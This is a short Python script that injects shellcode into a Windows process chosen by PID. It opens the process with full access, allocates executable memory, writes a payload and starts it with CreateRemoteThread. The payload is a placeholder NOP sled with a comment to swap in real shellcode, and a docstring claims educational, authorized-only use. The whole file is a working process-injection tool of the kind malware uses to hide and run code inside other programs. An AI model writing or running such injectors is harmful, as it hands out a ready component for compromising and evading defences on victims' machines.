#!/usr/bin/env python3

"""
Shellcode Injection Script
WARNING: For educational purposes only. Use only in authorized testing environments.
Requires Windows OS and appropriate permissions.
"""

import sys
from ctypes import *

# Usage: python shellcode_injector.py <PID>

if len(sys.argv) != 2:
    print("Usage: python shellcode_injector.py <PID>")
    sys.exit(1)

pid = int(sys.argv[1])

# Example shellcode (NOP sled - replace with actual shellcode)
shellcode = b"\x90" * 100

kernel32 = windll.kernel32

# Open process
h_process = kernel32.OpenProcess(0x1F0FFF, False, pid)

if not h_process:
    print(f"[!] Could not open process {pid}")
    sys.exit(1)

# Allocate memory for shellcode
mem_address = kernel32.VirtualAllocEx(h_process, 0, len(shellcode), 0x3000, 0x40)

if not mem_address:
    print("[!] Failed to allocate memory")
    sys.exit(1)

# Write shellcode to allocated memory
written = c_int(0)
if not kernel32.WriteProcessMemory(h_process, mem_address, shellcode, len(shellcode), byref(written)):
    print("[!] Failed to write shellcode to memory")
    sys.exit(1)

# Create remote thread to execute shellcode
h_thread = kernel32.CreateRemoteThread(h_process, None, 0, mem_address, None, 0, None)

if not h_thread:
    print("[!] Failed to create remote thread")
    sys.exit(1)

print(f"[+] Successfully injected shellcode into PID {pid}")
print(f"[+] Shellcode address: 0x{mem_address:08x}")
